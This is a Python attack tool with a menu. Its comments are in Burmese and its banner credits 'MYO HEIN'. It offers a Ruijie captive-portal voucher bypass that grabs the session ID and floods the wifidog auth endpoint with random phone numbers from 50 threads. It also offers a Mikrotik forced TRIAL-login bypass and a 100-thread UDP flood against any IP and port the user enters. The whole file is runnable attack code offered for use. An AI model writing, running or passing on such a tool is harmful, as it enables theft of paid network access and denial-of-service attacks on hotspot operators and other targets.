import os, sys, time, threading, socket, requests, re, urllib3, random
from urllib.parse import urlparse, parse_qs

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- COLORS ---
R, G, Y, C, W, M = "\033[1;31m", "\033[1;32m", "\033[1;33m", "\033[1;36m", "\033[1;37m", "\033[1;35m"

stop_event = threading.Event()

def banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    print(f"""{M}
   █████╗ ██╗   ██╗███╗   ██╗ ██████╗ 
  ██╔══██╗██║   ██║████╗  ██║██╔════╝ 
  ███████║██║   ██║██╔██╗ ██║██║  ███╗
  ██╔══██║██║   ██║██║╚██╗██║██║   ██║
  ██║  ██║╚██████╔╝██║ ╚████║╚██████╔╝
  ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝ {W}MYO HEIN{Y}
====================================================
  CORE    : {W}Ruijie / Mikrotik / Turbo{Y}
  ENGINE  : {G}Auth Injector v4.0 (Stable){Y}
===================================================={W}""")

# --- GLOBAL ENGINE ---
def turbo_injector(url):
    session = requests.Session()
    while not stop_event.is_set():
        try:
            # SSL check ကျော်ပြီး Gateway ဆီ request အတင်းပို့တာပါ
            session.get(url, timeout=5, verify=False)
            print(f"{G}[✓] Injecting Packets... [Turbo On]{W}", end="\r")
        except: pass

# --- BYPASS FUNCTIONS ---

def ruijie_mode():
    banner()
    print(f"{C}[*] Ruijie Voucher Bypass{W}")
    try:
        # Portal URL ကို အလိုအလျောက်ဖမ်းတာပါ
        res = requests.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=5)
        parsed = urlparse(res.url)
        params = parse_qs(parsed.query)
        
        gw = params.get('gw_address', ['192.168.60.1'])[0]
        port = params.get('gw_port', ['2060'])[0]
        sid = params.get('sessionId', [None])[0]
        
        if not sid:
            r_page = requests.get(res.url, verify=False)
            sid = re.search(r'sessionId=([a-zA-Z0-9]+)', r_page.text).group(1)

        print(f"{G}[+] Gateway: {gw} | SID: {sid}{W}")
        # Ruijie wifidog logic ကို random ဖုန်းနံပါတ်နဲ့ exploit လုပ်တာပါ
        target = f"http://{gw}:{port}/wifidog/auth?token={sid}&phonenumber={random.randint(11111111, 99999999)}"
        
        stop_event.clear()
        for _ in range(50):
            threading.Thread(target=turbo_injector, args=(target,), daemon=True).start()
            
        input(f"\n{Y}Ruijie Bypass Active... Press Enter to STOP.{W}")
        stop_event.set()
    except: print(f"{R}[!] Ruijie Portal Detect မရပါ!{W}"); time.sleep(2)

def mikrotik_mode():
    banner()
    print(f"{C}[*] Mikrotik Auth Bypass (Voucher/Trial Mode){W}")
    gw = input(f"{Y}Enter Mikrotik Gateway IP: {W}")
    if not gw: return
    
    # Mikrotik ရဲ့ Trial သို့မဟုတ် Voucher login ကို Force လုပ်မယ့် URL
    target = f"http://{gw}/login?username=TRIAL&dst=http://google.com"
    
    print(f"{M}[!] Launching Mikrotik Injector...{W}")
    stop_event.clear()
    for _ in range(50):
        threading.Thread(target=turbo_injector, args=(target,), daemon=True).start()
        
    input(f"\n{G}Mikrotik Force Login Active... Press Enter to STOP.{W}")
    stop_event.set()

def turbo_udp():
    banner()
    print(f"{R}[*] Turbo Engine (UDP Flood Mode){W}")
    ip = input(f"{Y}Enter Target IP: {W}")
    try:
        port = int(input(f"{Y}Enter Port (Default 80): {W}") or 80)
    except: return
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = os.urandom(1024)
    
    stop_event.clear()
    def flood():
        while not stop_event.is_set():
            try: sock.sendto(data, (ip, port))
            except: break

    print(f"{R}[!] UDP Flood Sending to {ip}...{W}")
    for _ in range(100):
        threading.Thread(target=flood, daemon=True).start()
        
    input(f"\n{G}Turbo Engine Running... Press Enter to STOP.{W}")
    stop_event.set()

# --- MAIN MENU ---

def main():
    while True:
        try:
            banner()
            print(f"{G}[1]{W} Ruijie Bypass")
            print(f"{G}[2]{W} Mikrotik Bypass")
            print(f"{G}[3]{W} Turbo Engine (UDP)")
            print(f"{R}[0]{W} Exit")
            
            choice = input(f"\n{C}Choice > {W}")
            if choice == '1': ruijie_mode()
            elif choice == '2': mikrotik_mode()
            elif choice == '3': turbo_udp()
            elif choice == '0':
                print(f"{G}GGMU! Victory for United! 🔴⚪⚫{W}")
                sys.exit()
        except KeyboardInterrupt:
            stop_event.set()
            break

if __name__ == "__main__":
    main()
